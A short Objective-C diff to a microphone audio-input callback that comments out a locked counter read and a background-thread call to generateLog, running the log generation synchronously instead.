@@ -766,18 +766,18 @@ void myInputAudioCallback(void                               *inUserData,
       
       if (fabs(interval) >= 20)
         {
-          [mLockGeneric lock];
-          fileCounter    = mFileCounter;
-          [mLockGeneric unlock];
+//          [mLockGeneric lock];
+//          fileCounter    = mFileCounter;
+//          [mLockGeneric unlock];
           
 #ifdef DEBUG_MIC
           infoLog(@"Logging #%d", fileCounter);
 #endif
 
-          [NSThread detachNewThreadSelector: @selector(generateLog)
-                                   toTarget: self
-                                 withObject: nil];
-          //[self generateLog];
+//          [NSThread detachNewThreadSelector: @selector(generateLog)
+//                                   toTarget: self
+//                                 withObject: nil];
+          [self generateLog];
 
           micStartedDate = [[NSDate date] retain];
         }
